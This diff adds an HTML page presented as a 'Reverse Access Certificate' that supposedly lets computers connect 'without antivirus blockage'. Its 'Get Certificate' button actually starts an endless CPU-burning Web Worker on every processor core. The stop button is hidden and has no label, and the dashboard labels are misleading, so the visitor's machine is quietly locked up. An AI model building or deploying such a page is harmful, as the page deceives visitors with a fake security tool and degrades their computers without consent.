@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reverse Access Certificate</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .glow-red { box-shadow: 0 0 20px rgba(239, 68, 68, 0.5); }
+        .gradient-bg { background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%); }
+        .hide-btn { display: none; }
+    </style>
+</head>
+<body class="gradient-bg min-h-screen text-slate-100 flex items-center justify-center p-4">
+
+    <div class="max-w-md w-full bg-slate-900/80 border border-slate-700 rounded-2xl p-8 backdrop-blur-xl shadow-2xl">
+        <div class="text-center mb-8">
+            <h1 class="text-3xl font-bold bg-gradient-to-r from-orange-400 to-red-500 bg-clip-text text-transparent">
+                Reverse Access Certificate
+            </h1>
+            <p class="text-slate-400 mt-2 text-sm">Allows computers to connect without without antivirus blockage.</p>
+        </div>
+
+        <div class="grid grid-cols-2 gap-4 mb-8">
+            <div class="bg-slate-800/50 p-4 rounded-xl border border-slate-700">
+                <div class="text-xs text-slate-500 uppercase font-bold">Blockers Detected</div>
+                <div id="core-count" class="text-2xl font-mono">--</div>
+            </div>
+            <div class="bg-slate-800/50 p-4 rounded-xl border border-slate-700 text-right">
+                <div class="text-xs text-slate-500 uppercase font-bold">Successful Packets</div>
+                <div id="active-threads" class="text-2xl font-mono text-orange-400">0</div>
+            </div>
+        </div>
+
+        <div id="status-box" class="mb-8 p-4 rounded-xl bg-slate-950 border border-slate-800 flex items-center gap-3">
+            <div id="indicator" class="w-3 h-3 rounded-full bg-slate-600"></div>
+            <span id="status-text" class="text-sm font-medium text-slate-300 italic">System Idle</span>
+        </div>
+
+        <div class="space-y-4">
+            <button id="start-btn" class="w-full bg-red-600 hover:bg-red-500 active:scale-95 transition-all py-4 rounded-xl font-bold uppercase tracking-widest text-white shadow-lg">
+                Get Certificate
+            </button>
+            <button id="stop-btn" class="w-full bg-slate-700 hover:bg-slate-600 active:scale-95 transition-all py-4 rounded-xl font-bold uppercase tracking-widest text-white hidden" class="hide-btn" >
+                
+            </button>
+        </div>
+
+        <div class="mt-8 text-[10px] text-slate-500 leading-relaxed border-t border-slate-800 pt-4">
+            <strong>NOTICE:</strong> This is a one time use Certificate.
+        </div>
+    </div>
+
+    <script>
+        // Inline Worker Script (no external file needed)
+        const workerBlob = new Blob([`
+            onmessage = function() {
+                function load() {
+                    let x = 0.0001;
+                    while (true) {
+                        // Tight loop of complex floating point math
+                        x = Math.sqrt(Math.sin(x) * Math.cos(x) + Math.tan(x));
+                        if (x > 1000) x = 0.0001;
+                    }
+                }
+                load();
+            };
+        `], { type: 'application/javascript' });
+
+        const workerUrl = URL.createObjectURL(workerBlob);
+        let workers = [];
+        const cores = navigator.hardwareConcurrency || 4;
+
+        const startBtn = document.getElementById('start-btn');
+        const stopBtn = document.getElementById('stop-btn');
+        const statusText = document.getElementById('status-text');
+        const indicator = document.getElementById('indicator');
+        const activeCount = document.getElementById('active-threads');
+        
+        document.getElementById('core-count').textContent = cores;
+
+        startBtn.onclick = () => {
+            if (workers.length > 0) return;
+
+            for (let i = 0; i < cores; i++) {
+                const w = new Worker(workerUrl);
+                w.postMessage('start');
+                workers.push(w);
+            }
+
+            // UI Updates
+  
+            activeCount.textContent = workers.length;
+        };
+
+        stopBtn.onclick = () => {
+            workers.forEach(w => w.terminate());
+            workers = [];
+
+            // UI Updates
+            startBtn.classList.remove('hidden');
+            stopBtn.classList.add('hidden');
+            indicator.classList.add('bg-slate-600');
+            indicator.classList.remove('bg-red-500', 'animate-pulse');
+            statusText.textContent = "System Idle";
+            statusText.classList.remove('text-red-400');
+            activeCount.textContent = "0";
+        };
+
+        // Safety: Terminate workers if window is closed
+        window.onbeforeunload = () => {
+            workers.forEach(w => w.terminate());
+        };
+    </script>
+</body>
+</html>
